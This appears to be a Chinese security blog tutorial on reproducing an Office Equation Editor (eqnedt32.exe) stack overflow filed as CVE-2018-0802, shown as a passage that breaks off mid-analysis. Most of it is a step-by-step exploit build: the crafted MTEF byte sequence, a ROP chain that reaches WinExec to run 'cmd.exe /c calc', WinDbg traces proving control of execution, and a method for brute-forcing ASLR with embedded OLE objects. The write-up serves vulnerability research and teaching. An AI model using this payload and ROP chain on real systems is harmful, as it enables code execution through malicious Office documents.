> 原文链接: https://www.anquanke.com//post/id/94841 


# 手把手教你复现office公式编辑器内的第三个漏洞


                                阅读量   
                                **231065**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0190a1725a8d8ea3ad.jpg)](https://p5.ssl.qhimg.com/t0190a1725a8d8ea3ad.jpg)

## 前言

当看到国外的安全公司checkpoint也发了一篇关于CVE-2018-0802的分析文章时，我仔细阅读了一下，然后意识到这个漏洞和国内厂商报的CVE-2018-0802并不是同一个漏洞。很明显，微软又偷懒了，把两个不同的漏洞放在同一个CVE下进行致谢，我决定复现一下他们发现的CVE-2018-0802。在复现的过程中，我一开始照着checkpoint文章的错误提示走歪了，最后发现checkpoint的CVE-2018-0802漏洞其实位于Matrix record(0x05)的解析逻辑内。这是公式编辑器内除了CVE-2017-11882和CVE-2018-0802-font外的第三个能被利用的漏洞。



## 逐步构造exp

我首先在win7 x86+office2007+未开启ASLR的eqnedt32.exe上开始构造样本。

checkpoint的文章里说溢出点位于size record的处理逻辑中，我对着下面的说明文档看了许久，没什么头绪：

[http://rtf2latex2e.sourceforge.net/MTEF3.html#SIZE_record](http://rtf2latex2e.sourceforge.net/MTEF3.html#SIZE_record)

在调试器里面下断点，手里的样本也没一个能走到文章中提到的函数的，于是我决定从零开始构造样本。

checkpoint的文章已经解释得很清楚了：这个漏洞的成因是sub_443e34函数中调用的两个sub_443F6c(图1)会通过获取到的v12，v13的值来拷贝相应长度的数据到栈变量上，而v12，13为用户所控制，拷贝的目的地址v6，v8均为栈上的整型变量，大小只有4个字节，这样一来只要精心控制长度，就可以导致栈溢出。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01be1045c16d7c03ea.png)

图1

我们来看一下sub_443f6c函数(图2)：

[![](https://p5.ssl.qhimg.com/t01605b96aed510e215.png)](https://p5.ssl.qhimg.com/t01605b96aed510e215.png)

图2

这个函数的基本作用为通过第一个参数的值计算得到一个长度，计算公式为:

calc_length = (arg0 × 2 + 9) &gt;&gt; 3

然后取出后面数据中对应长度的字节数拷贝给传入的第二参数，在处理size时第二参数为父函数传入的一个栈变量。很明显，如果计算出来的calc_length大于4个字节，就会发生栈溢出，而由于v6和v8在栈上非常靠近函数的返回地址，所以只要构造合适的拷贝长度，sub_443e34函数的返回地址就会被覆盖，从而使我们控制执行流(图3)。

[![](https://p2.ssl.qhimg.com/t0194f52a4575aefebc.png)](https://p2.ssl.qhimg.com/t0194f52a4575aefebc.png)

图3：红框为v6，蓝框为v8，黑框为ret_addr，可以看到v6和v8之间隔16个字节，v8和ret_addr之间隔16个字节

但是，一开始最大的问题是，我尝试根据格式规范去构造size的数据，无论如何也走不到sub_443e34函数，这个时候只能先借助IDA了。

通过交叉引用我发现sub_443e34函数在一个疑似虚表的地方被引用，且相对表头的偏移为0x20, 看来我需要找一下有哪些地方引用了off_454f30(图4)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bf7db79a04ec1af0.png)

图4

可以看到对sub_443e34的引用有6处(图5)

[![](https://p3.ssl.qhimg.com/t014137c0c5610bc4b2.png)](https://p3.ssl.qhimg.com/t014137c0c5610bc4b2.png)

图5

通过排查，我发现了图中高亮的这一行后面调用了偏移为0x20的一个函数，很明显这里会调用sub_443e34函数(图6)

[![](https://p5.ssl.qhimg.com/t0199e790f30d50eb05.png)](https://p5.ssl.qhimg.com/t0199e790f30d50eb05.png)

图6

调用点位于sub_43a78f函数，这个函数里面有一个跳转表，当case为4的时候就会获取对应的虚表指针，接着调用偏移为0x20处对应的函数。

于是我接着看了一下对sub_43a78f的交叉引用，一共6处(图7)，每一处的函数结构都差不多，应该是在读入数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01be4f0d8086d2014b.png)

图7

引起我注意的是高亮部分的这处引用，调用它的是sub_437c9d(图8)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014e9680a7e3a8b37e.png)

图8

而sub_437c9d我恰好有印象，因为它在解析MTEF的二级入口函数sub_43755c内被调用(图9)：

[![](https://p3.ssl.qhimg.com/t012b9c345644f81568.png)](https://p3.ssl.qhimg.com/t012b9c345644f81568.png)

图9

所以如果尝试构造数据，等下一个可能的执行流将会是下面这样的(图10)(之前CVE-2017-11882/CVE-2018-0802的图里面有个函数的地址一直写错(把42f8ff写成了42ff88)，这里更正一下)

[![](https://p4.ssl.qhimg.com/t01cd2219e715e5a8bc.png)](https://p4.ssl.qhimg.com/t01cd2219e715e5a8bc.png)

图10：注意，这幅图case 4后面的注释是错的，因为此时我的思维还在size上面

所以，接下来要做的事情就是构造合适的size tag数据，使执行流走到上图中金黄色的地方，然后精心计算长度构造栈溢出，控制返回地址，然后再用ROP跳转到对WinExec函数的调用处并传入合适的参数指针。ROP部分的构造因为checkpoint直接给出了，所以最后直接用就行。难点在于让执行流走到溢出点(因为checkpoint文章中的截图并没有给这部分信息)。

由sub_443e34函数可以看到，在读入v12和v13前，还读入了其他3个字节，我们来对照MTEF3的size说明看一下(图11)：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015eb10de68e504f84.png)

图11：注意，最后回过头来发现，这部分彻底走歪了

size的表示大致有3中情况，看着有点头大，既然sub_443e34内一下子读入了5个字节，我就挑选一个占用字节数最多的吧(但总感觉结构对不上，心里还是充满疑惑)，于是我选择了最后一个else，于是size tag的数据大致构造如下：

```
09 // tag

64 // 0n100

01 // lsize

02 // dsize-high-byte

03 // dsize-low-byte
```

用的方法和初始的ole数据还是我调试CVE-2017-11882时的文件，详情参考《CVE-2017-11882漏洞分析、利用及动态检测》这篇文章。

而且既然checkpoint里面给出了下面这张截图[![](https://p1.ssl.qhimg.com/t01ab7818da1373308d.png)](https://p1.ssl.qhimg.com/t01ab7818da1373308d.png)

图12

那么不妨假设dsize的两个字节分别为1c和4c，于是我的初始数据就变成了下面这样

```
03 01 01 03 0A // MTEF头部

0A

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte
```

在原模板替换这些数据，上调试器，很不幸地发现进入sub_43755C函数后，并没有走到case 4的地方，于是我决定审视一下tag的解析流程。后面会发现这部分的理解都是错的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c460f2732f7d0a9a.png)

图13

上图中v6代表了读入的tag，在这里是0x09，然后将v6传到sub_43A720函数，调用完成后返回一个值给v20，然后根据v20的值在switch语句里面进行选择，显然，这里我想让sub_43a720给我返回一个4，于是需要进一步看一下sub_43a720的逻辑(图14)。

[![](https://p2.ssl.qhimg.com/t019f983f7cc643f3e5.png)](https://p2.ssl.qhimg.com/t019f983f7cc643f3e5.png)

图14

可以看到sub_43a720函数首先传入了代表tag的值a1，获得一个返回值v3，然后计算 (v3 &amp; 0xF0) &gt;&gt; 4的值(这个公式的本质是保留高4位，然后将高4位的值移到低4位上)，如果这个值的第4个比特位为1(00001000)，则进入sub_43ac22函数，否则进入else语句，并最终返回v3 &amp; 0xF。显然，这里我想让 v3 &amp; 0xF = 4。

所以我需要再看一下sub_43a87a里面的逻辑是什么(图15)：

[![](https://p4.ssl.qhimg.com/t019574e29eaef3916a.png)](https://p4.ssl.qhimg.com/t019574e29eaef3916a.png)

图15

可以看到sub_43a87a的逻辑也很清晰，先取出低4位代表的tag，然后与8作比较，若tag为8，则进入Font tag的处理函数，这个流程一路走下去会触发CVE-2017-11882和CVE-2018-0802-font。如果tag不是8，则判断tag是否小于9，若小于9则直接返回tag，否则先调用sub_43b1d0函数，然后取出数据中的下一个字节，重复前面的逻辑，直到找到一个小于8的tag。

从上面的分析看出当tag为9时，会接着读入下一个字节，sub_43a87a函数的返回值是用户提供的，回到sub_43a720，现在，我只要保证(dsize-low-byte的下一个字节 &amp; 0xF = 4)即可，于是我把下一个字节设为0x44应该就可以进入case 4了。

到现在为止，我的数据构成如下：

```
03 01 01 03 0A // MTEF头部

0A

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte

44 // 确保进入case 4
```

和前面一样，先来逆向一下sub_437c9d函数的逻辑(图16)：进入case 4后，能否直接到达sub_437c9d的调用处呢，在调试器中发现居然可以，于是进入sub_437c9d。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0160c13875d5142466.png)

图16

可以看到sub_437c9d的函数逻辑非常简单，基本上就是：

循环读入下一个字节-&gt;如果不为空则调用sub_43a78f进行相应的解析

我们来看一下sub_43a78f的函数逻辑(图17)：

[![](https://p1.ssl.qhimg.com/t014a901fe901be2fb8.png)](https://p1.ssl.qhimg.com/t014a901fe901be2fb8.png)

图17

可以看到sub_43a78f先是调用sub_43a720函数，然后将其的返回值减去1得到一个case值，最后在一个switch语句中根据case获取相应的虚表地址，最后调用 [地址+0x20] 处的函数进行处理。显然，只要进入case 4，就可以进入checkpoint文章中提到的sub_443e34函数，从而顺利到达cve-2018-0802-size的溢出现场。

本来还要再看一下sub_43a720函数的逻辑，但sub_43a720的逻辑上面刚刚分析过(图14)，所以我只要让下一个读入的字节等于5即可(dsize-low-byte的后面第6个字节 &amp; 0xF = 5，调试时发现前面的解析中会读入dsize-low-byte后面的5个字节)。

所以，到目前为止我构造的数据如下：

```
03 01 01 03 0A // MTEF头部

0A // 初始SIZE

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte

44 // 确保进入case 4

66 // 填充用，随意

77 // 填充用，随意

09 // 填充用，随意

05 // 填充用，随意

AA // 填充用，随意

55 // 确保进入第2个case 4
```

好了，现在我已经进入sub_443e34函数了，可以看到这个函数在读入v12,v13对应的数值前，还会读入3个字节，所以需要在55后面继续填充3个字节，然后是v12和v13对应的数值，因为checkpoint文章中给的是0x1c,0x4c，所以我直接拿来用了。这样一来，就可以顺利进入sub_443e34函数，实际情况也确实如此。

现在，我构造的数据变成了如下：

```
03 01 01 03 0A // MTEF头部

0A // 初始SIZE

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte

44 // 确保进入case 4

66 // 填充用，随意

77 // 填充用，随意

09 // 填充用，随意

05 // 填充用，随意

AA // 填充用，随意

55 // 确保进入第2个case 4

10 // sub_443e34内读入的第1个字节

11 // sub_443e34内读入的第2个字节

12 // sub_443e34内读入的第3个字节

1c // 等待计算以决定拷贝大小的长度1

4c // 等待计算以决定拷贝大小的长度2
```

calc_length = (arg0 × 2 + 9) &gt;&gt; 3文章最开始(图2)我们已经知道拷贝长度的计算公式为：

我们来看一下1c和4c返回的值分别为多少：

```
-- python --

print hex((2 * 0x1c + 9) &gt;&gt; 3)

0x8



print hex((2 * 0x4c + 9) &gt;&gt; 3)

0x14
```

现在，把checkpoint截图中的数据全部抄过来后，我构造的数据如下(图18)：由前面的图3可以看到checkpoint提供的两个长度，在拷贝完后分别会拷贝8个字节和20个字节，也即第一次调用sub_443F6c会覆盖v6(含)到v8(不含)的0x8个字节，第二次调用sub_443F6c会覆盖vac_C(含)到ret_addr(含)的0x14个字节。从而成功覆盖返回地址，获取控制流。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e82e6197c3b31e56.png)

图18

```
03 01 01 03 0A // MTEF头部

0A // 初始SIZE

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte

44 // 确保进入case 4

66 // 填充用，随意

77 // 填充用，随意

09 // 填充用，随意

05 // 填充用，随意

AA // 填充用，随意

55 // 确保进入第2个case 4

10 // sub_443e34内读入的第1个字节

11 // sub_443e34内读入的第2个字节

12 // sub_443e34内读入的第3个字节

1c // 等待计算以决定拷贝大小的长度1

4c // 等待计算以决定拷贝大小的长度2

63 6d 64 2e 65 78 65 20 // 第一次拷贝的8个字节

2f 63 63 61 6c 63 00 44 44 44 44 44 ef be ad de ef be ad de // 第二次拷贝的20个字节
```

```
0:000&gt; p

eax=001f15f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00443efc esp=0012f480 ebp=deadbeef iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

EqnEdt32!MFEnumFunc+0x156ff:

00443efc c3              ret

0:000&gt; t

eax=001f15f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=deadbeef esp=0012f484 ebp=deadbeef iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

deadbeef ??              ???

0:000&gt; db eax

001f15f2  30 4f 45 00 7a 16 1f 00-00 00 00 00 00 00 00 00  0OE.z...........

001f1602  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

001f1612  00 00 00 00 00 00 00 00-96 fe 00 00 44 0b aa 14  ............D...

001f1622  1f 00 63 6d 64 2e 65 78-65 20 2f 63 63 61 6c 63  ..cmd.exe /ccalc

001f1632  00 44 44 44 44 44 e4 14-1f 00 10 01 3a 00 20 5a  .DDDDD......:. Z

001f1642  45 00 7a 16 1f 00 00 00-00 00 00 00 00 00 00 00  E.z.............

001f1652  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

001f1662  00 00 00 00 00 00 00 00-00 00 44 00 00 00 00 00  ..........D.....
```

同时，与checkpoint的文章中描述的一致, 此时的eax指向命令行参数的前第0x32个字节处。不出所料，此时的eip被覆盖为0xdeadbeef，正如checkpoint文章中所示的那样。

到这里就简单了，我们需要用到rop，checkpoint已经在他们的文章中给出rop的生成方法了，我直接用了他们的，主要意图就是是确保栈溢出后栈上的布局如下：

[![](https://p2.ssl.qhimg.com/t017030c45ca5e58026.png)](https://p2.ssl.qhimg.com/t017030c45ca5e58026.png)

在没有开启aslr的eqnedt32版本上尝试，此时的base固定为0x400000，用Python脚本生成相应的rop语句。根据溢出长度此时第一次拷贝长度为8，第二次拷贝长度为40个字节，所以之前的控制长度的字节需要从1c 4c调整为1c 9c((2 * 0x9c + 9) &gt;&gt; 3 = 0x28)

现在，在不打11月补丁的版本上，我构造的全部数据如下：

```
03 01 01 03 0A // MTEF头部

0A // 初始SIZE

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte

44 // 确保进入case 4

66 // 填充用，随意

77 // 填充用，随意

09 // 填充用，随意

05 // 填充用，随意

AA // 填充用，随意

55 // 确保进入第2个case 4

10 // sub_443e34内读入的第1个字节

11 // sub_443e34内读入的第2个字节

12 // sub_443e34内读入的第3个字节

1c // 等待计算以决定拷贝大小的长度1

4c // 等待计算以决定拷贝大小的长度2

63 6d 64 2e 65 78 65 20 // 第一次拷贝的8个字节

2f 63 63 61 6c 63 00 44 44 44 44 44

19 00 00 00 // ebp

3a c7 44 00 // ret_addr: add esp, 4; ret

28 5b 45 00 // a read_write addr

b6 0e 41 00 // add eax, ebp; ret 2

b6 0e 41 00 // add eax, ebp; ret 2

00 00       // pad for adjust stack by 2 bytes

4b ed 40 00 // push eax; call sub_30C00(which call WinExec)

00 00       // pad for align by 4 bytes
```

将构造好的数据替换原来的数据，调试运行，却发现公式编辑器直接退出了，仔细排查后发现是ret前的sub_437c9d函数中调用sub_43a78f导致的(图19)，应该是case语句没有取到合适的值，导致虚函数调用失败，从而导致进程退出。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019ec949185c1c0122.png)

图19

由于这两个函数我前面都分析过(图8和图17)，所以这里直接让下一个字节等于0就行，这样就会直接break，不会继续去解析tag。

最终，在不打11月补丁的版本上，我构造的全部数据如下：

```
03 01 01 03 0A // MTEF头部

0A // 初始SIZE

09 // tag

64 // 0n100

22 // lsize

1c // dsize-high-byte

4c // dsize-low-byte

44 // 确保进入case 4

66 // 填充用，随意

77 // 填充用，随意

09 // 填充用，随意

05 // 填充用，随意

AA // 填充用，随意

55 // 确保进入第2个case 4

10 // sub_443e34内读入的第1个字节

11 // sub_443e34内读入的第2个字节

12 // sub_443e34内读入的第3个字节

1c // 等待计算以决定拷贝大小的长度1

4c // 等待计算以决定拷贝大小的长度2

63 6d 64 2e 65 78 65 20 // 第一次拷贝的8个字节

2f 63 63 61 6c 63 00 44 44 44 44 44

19 00 00 00 // ebp

3a c7 44 00 // ret_addr: add esp, 4; ret

28 5b 45 00 // a read_write addr

b6 0e 41 00 // add eax, ebp; ret 2

b6 0e 41 00 // add eax, ebp; ret 2

00 00       // pad for adjust stack by 2 bytes

4b ed 40 00 // push eax; call sub_30C00(which call WinExec)

00 00       // pad for align by 4 bytes

00 00 00 00 // 保证执行流顺利到达ret(我这里加了4个00，加1个即可)
```

```
0:000&gt; bp 443e34



0:000&gt; g

...

Sat Jan 13 21:14:17.616 2018 (GMT+8): Breakpoint 0 hit

eax=00454f30 ebx=00000006 ecx=0012f4ac edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00443e34 esp=0012f480 ebp=0012f4b4 iopl=0         nv up ei ng nz ac pe cy

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297

EqnEdt32!MFEnumFunc+0x15637:

00443e34 55              push    ebp

...



0:000&gt; g

Sat Jan 13 21:14:30.970 2018 (GMT+8): Breakpoint 1 hit

eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00443efc esp=0012f480 ebp=00000019 iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

EqnEdt32!MFEnumFunc+0x156ff:

00443efc c3              ret

0:000&gt; t

eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=0044c73a esp=0012f484 ebp=00000019 iopl=0         nv up ei pl nz ac po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212

EqnEdt32!FltToolbarWinProc+0x25d3:

0044c73a 83c404          add     esp,4

0:000&gt; t

eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=0044c73d esp=0012f488 ebp=00000019 iopl=0         nv up ei pl nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206

EqnEdt32!FltToolbarWinProc+0x25d6:

0044c73d c3              ret

0:000&gt; t

eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00410eb6 esp=0012f48c ebp=00000019 iopl=0         nv up ei pl nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206

EqnEdt32!EqnFrameWinProc+0x23d6:

00410eb6 01e8            add     eax,ebp

0:000&gt; t

eax=0026160b ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00410eb8 esp=0012f48c ebp=00000019 iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

EqnEdt32!EqnFrameWinProc+0x23d8:

00410eb8 c20200          ret     2

0:000&gt; t

eax=0026160b ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00410eb6 esp=0012f492 ebp=00000019 iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

EqnEdt32!EqnFrameWinProc+0x23d6:

00410eb6 01e8            add     eax,ebp

0:000&gt; t

eax=00261624 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00410eb8 esp=0012f492 ebp=00000019 iopl=0         nv up ei pl nz ac pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216

EqnEdt32!EqnFrameWinProc+0x23d8:

00410eb8 c20200          ret     2

0:000&gt; t

eax=00261624 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=0040ed4b esp=0012f498 ebp=00000019 iopl=0         nv up ei pl nz ac pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216

EqnEdt32!EqnFrameWinProc+0x26b:

0040ed4b 50              push    eax

0:000&gt; t

eax=00261624 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=0040ed4c esp=0012f494 ebp=00000019 iopl=0         nv up ei pl nz ac pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216

EqnEdt32!EqnFrameWinProc+0x26c:

0040ed4c e8af1e0200      call    EqnEdt32!MFEnumFunc+0x2403 (00430c00)



0:000&gt; t

eax=00261624 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00430c00 esp=0012f490 ebp=00000019 iopl=0         nv up ei pl nz ac pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216

EqnEdt32!MFEnumFunc+0x2403:

00430c00 55              push    ebp

...

0:000&gt; p

eax=00261624 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0

eip=00430c12 esp=0012f378 ebp=0012f48c iopl=0         nv up ei pl nz na po nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202

EqnEdt32!MFEnumFunc+0x2415:

00430c12 ff151c684600    call    dword ptr [EqnEdt32!FltToolbarWinProc+0x1c6b5 (0046681c)] ds:0023:0046681c=`{`kernel32!WinExec (774bedae)`}`

0:000&gt; db eax

00261624  63 6d 64 2e 65 78 65 20-2f 63 63 61 6c 63 00 44  cmd.exe /ccalc.D

00261634  44 44 44 44 e4 14 26 00-10 08 3a 00 20 5a 45 00  DDDD..&amp;...:. ZE.

00261644  7a 16 26 00 00 00 00 00-00 00 00 00 00 00 00 00  z.&amp;.............

00261654  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

00261664  00 00 00 00 00 00 00 00-44 00 00 00 00 00 00 00  ........D.......

00261674  00 00 00 00 3a 00 68 4f-45 00 ee 16 26 00 00 00  ....:.hOE...&amp;...

00261684  00 00 00 00 00 00 00 00-00 00 00 00 00 00 90 00  ................

00261694  00 00 80 01 00 00 00 00-00 00 00 00 00 00 00 00  ................



0:000&gt; p

Sat Jan 13 21:15:03.106 2018 (GMT+8): ModLoad: 753f0000 7543c000   C:\Windows\system32\apphelp.dll

eax=00000021 ebx=00000006 ecx=0012f2d8 edx=775a70f4 esi=0012f7e4 edi=0012f5e0

eip=00430c18 esp=0012f380 ebp=0012f48c iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246

EqnEdt32!MFEnumFunc+0x241b:

00430c18 83f820          cmp     eax,20h
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e1ee8f8e34a3f261.png)计算器成功弹出(图20)：

图20



## 对暴力破解ASLR的探索

在11月的补丁上，由于eqnedt32.exe开启了ASLR，所以需要想一个办法Bypass ASLR。checkpoint的文章中用了内嵌256个ole的方式来Bypass ASLR(这个思路我第一次看到是在Haifei Li 2016年Bluehat演讲的一篇paper上《lihaifei-Analysis_of_the_Attack_Surface_of_Microsoft_Office_from_User_Perspective》 49页)。

我仔细审视了一下这种方法，我也在(windows7+office2007/office2010)和(windows10+office2016)(全部为x86)，3个环境上试了一下这种方法，这里简单提一下我观察到的现象。

在win7上，eqnedt32.exe基址的随机化大致在(0x0001000-0x02000000)之间，可以很容易算出可能性为512种，所以256个ole显然是必要但是不充分的。

可以看到win7下的基址变化幅度比较大(图21)：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ec1ffca25c34b976.png)

图21

在win10上，eqnedt32.exe很多时候会落在(0x01000000-0x02000000)之间(但是也有小于0x01000000的情况)，而且总是很接近0x01000000，此时基址的可能性大概为256种。

win7和win10上eqnedt32在几十次加载中有大部分情况加载地址都是同一个。win7下通过内嵌ole连续加载几十次eqnedt32.exe基址变化示例(图22)：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01adc84668544b5edc.png)

图22

实际运行发现，每次打开office，256个ole里面实际被加载的在40-60个左右(目前并不清楚为什么)，也就是说，如果前40-60个ole不能暴力破解ASLR，整个利用就会失效。

但还是有成功的可能性，win7上10次里面大概会有2次成功(加载基址恰好是接近0x10000的小地址)，win10上如果从0x01000000开始暴力破解的话，成功的可能性也比较高，但是也不是100%。

所以我觉得checkpoint的文章中关于这段的叙述是有问题的(checkpoint的256应该是指win10, 但即使是win10也不止256种)。

附上一张打了11月的补丁后在office2010上成功暴力破解ASLR的截图(图23)：

[![](https://p0.ssl.qhimg.com/t01fa86992f1b53302a.png)](https://p0.ssl.qhimg.com/t01fa86992f1b53302a.png)

图23



## 审视前面的构造过程

前面的构造过程看似没什么问题，但是整个过程真的是对的吗？还记得上面遇到的那些疑问吗吗？现在来审视一下：

“我对着下面的说明文档看了许久，没什么头绪”

“ 一开始最大的问题是，我尝试根据格式规范去构造size的数据，无论如何也走不到sub_443e34函数”

“但总感觉结构对不上，心里还是充满疑惑”

后面的整个构造过程虽然我是以SIZE record为入口构造出来的，但问题部分的数据真的位于SIZE吗？

正当这些疑问盘旋在我脑海时，我读到了一篇文章：[http://ith4cker.com/content/uploadfile/201801/bd671515949243.pdf](http://ith4cker.com/content/uploadfile/201801/bd671515949243.pdf)

这篇文章的意思简而言之就是：在公式编辑器里面存在一个不同于CVE-2017-11882和CVE-2018-0804的漏洞，并且这个漏洞是在解析MATRIX record时触发的。有趣了，难道这又是第4个漏洞？！

仔细阅读文章后，我发现这篇文章的分析思路和我的构造过程基本一致。很明显，我在构造过程中通过逆向无意间构造出了一个MATRIX record，图24红框中的这个0x55，由于sub_43a720函数在解析时只会获取低4字节(&amp; 0x0F)，所以等价于0x05，我们来看一下0x05是什么(图25)

